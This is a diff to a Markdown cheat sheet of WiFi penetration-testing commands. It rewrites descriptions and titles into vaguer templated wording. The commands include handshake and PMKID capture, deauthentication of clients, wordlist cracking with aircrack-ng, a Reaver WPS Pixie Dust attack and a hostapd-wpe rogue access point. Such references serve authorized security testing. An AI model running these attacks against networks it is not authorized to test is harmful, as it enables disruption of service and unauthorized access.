@@ -4,18 +4,18 @@
 
 ### Kill conflicting processes
 
-Kill processes that interfere with monitor mode.
+Run kill conflicting processes with Wifi.
 
-```sh title:"Kill monitor-mode conflicting processes"
+```sh title:"Wifi Run Kill Conflicting Processes"
 airmon-ng check kill
 ```
 <!-- cheat -->
 
 ### Start monitor mode
 
-Start monitor mode on a wireless interface.
+Start monitor mode with Wifi.
 
-```sh title:"Start monitor mode"
+```sh title:"Wifi Start Monitor Mode"
 airmon-ng start "$wlan_interface"
 ```
 <!-- cheat
@@ -24,9 +24,9 @@ var wlan_interface := wlan0
 
 ### Stop monitor mode
 
-Stop monitor mode on a monitor interface.
+Run stop monitor mode with Wifi.
 
-```sh title:"Stop monitor mode"
+```sh title:"Wifi Run Stop Monitor Mode"
 airmon-ng stop "$wlanmon_interface"
 ```
 <!-- cheat
@@ -35,18 +35,18 @@ var wlanmon_interface := wlan0mon
 
 ### Restart NetworkManager
 
-Restart NetworkManager after monitor-mode work.
+Start restart NetworkManager with Wifi.
 
-```sh title:"Restart NetworkManager"
+```sh title:"Wifi Start Restart NetworkManager"
 systemctl restart NetworkManager
 ```
 <!-- cheat -->
 
 ### Managed mode
 
-Set a wireless interface back to managed mode.
+Set managed mode with Wifi.
 
-```sh title:"Set WiFi interface to managed mode"
+```sh title:"Wifi Set Managed Mode"
 nmcli device set "$wlan_interface" managed true
 ```
 <!-- cheat
@@ -57,9 +57,9 @@ var wlan_interface := wlan0
 
 ### Monitor all
 
-Monitor nearby wireless networks.
+Run monitor all with Wifi.
 
-```sh title:"Monitor nearby WiFi networks"
+```sh title:"Wifi Run Monitor All"
 airodump-ng "$wlanmon_interface"
 ```
 <!-- cheat
@@ -68,9 +68,9 @@ var wlanmon_interface := wlan0mon
 
 ### Monitor BSSID
 
-Capture traffic for one BSSID on a channel.
+Run monitor BSSID with Wifi.
 
-```sh title:"Capture traffic for one BSSID"
+```sh title:"Wifi Run Monitor BSSID"
 airodump-ng --bssid "$bssid" -c "$channel" -w "$output_file" "$wlanmon_interface"
 ```
 <!-- cheat
@@ -82,9 +82,9 @@ var wlanmon_interface := wlan0mon
 
 ### PMKID capture
 
-Capture WPA PMKID material with hcxdumptool.
+Dump PMKID capture with Wifi.
 
-```sh title:"Capture WPA PMKID with hcxdumptool"
+```sh title:"Wifi Dump PMKID Capture"
 hcxdumptool -i "$wlanmon_interface" -o "$capture_file" --enable_status=1 -c "$channel"
 ```
 <!-- cheat
@@ -95,9 +95,9 @@ var channel
 
 ### Convert hcx capture
 
-Convert a pcapng capture to hashcat 22000 format.
+Convert hcx capture with Wifi.
 
-```sh title:"Convert hcx capture to hashcat 22000"
+```sh title:"Wifi Convert Hcx Capture"
 hcxpcapngtool -o "$hash_file" "$capture_file"
 ```
 <!-- cheat
@@ -109,9 +109,9 @@ var capture_file := capture.pcapng
 
 ### Deauth client
 
-Send deauthentication frames to a client.
+Run deauth client with Wifi.
 
-```sh title:"Deauth WiFi client"
+```sh title:"Wifi Run Deauth Client"
 aireplay-ng --deauth "$deauth_count" -c "$client_mac" -a "$bssid" "$wlanmon_interface"
 ```
 <!-- cheat
@@ -123,9 +123,9 @@ var wlanmon_interface := wlan0mon
 
 ### Crack PSK
 
-Crack a captured handshake with a wordlist.
+Crack PSK with Wifi.
 
-```sh title:"Crack WiFi handshake with aircrack-ng"
+```sh title:"Wifi Crack PSK"
 aircrack-ng -w "$wordlist" "$capture_file"
 ```
 <!-- cheat
@@ -135,9 +135,9 @@ var capture_file
 
 ### WPS pixiedust
 
-Run Reaver Pixie Dust attack.
+Execute WPS pixiedust with Wifi.
 
-```sh title:"Run Reaver WPS Pixie Dust attack"
+```sh title:"Wifi Execute WPS Pixiedust"
 reaver -i "$wlanmon_interface" -b "$bssid" -c "$channel" -Z
 ```
 <!-- cheat
@@ -148,9 +148,9 @@ var channel
 
 ### Fake AP
 
-Launch hostapd-wpe with a config.
+Start fake AP with Wifi.
 
-```sh title:"Launch hostapd-wpe"
+```sh title:"Wifi Start Fake AP"
 hostapd-wpe "$hostapd_conf"
 ```
 <!-- cheat
@@ -161,9 +161,9 @@ var hostapd_conf := /etc/hostapd-wpe/hostapd-wpe.conf
 
 ### Kismet
 
-Monitor WiFi with Kismet.
+Run kismet with Wifi.
 
-```sh title:"Monitor WiFi with Kismet"
+```sh title:"Wifi Run Kismet"
 kismet -c "$wlan_interface"
 ```
 <!-- cheat
